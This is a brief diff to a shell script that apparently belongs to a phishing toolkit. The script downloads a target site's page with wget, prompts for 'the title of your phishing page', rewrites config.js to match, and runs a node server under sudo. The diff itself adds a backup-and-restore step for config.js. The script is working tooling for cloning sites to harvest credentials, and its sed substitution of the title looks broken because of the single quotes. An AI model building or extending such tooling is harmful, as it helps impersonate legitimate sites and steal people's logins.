@@ -16,13 +16,16 @@ sleep 1
 cd files
 wget ${DOM}
 cd ..
+cp config.js config.js.bak
 echo -e "${W}Please enter the title of your phishing page"
 echo -e "${ORNG}eg. facebook${NC}"
 read TITLE
 sed -i 's/facebook/${TITLE}/g' config.js
 sleep 5
 sudo node stp.js
-
 sleep 5
+rm config.js
+mv config.js.bak config.js
+sleep 2
 cd ../..
 ./tiger.sh
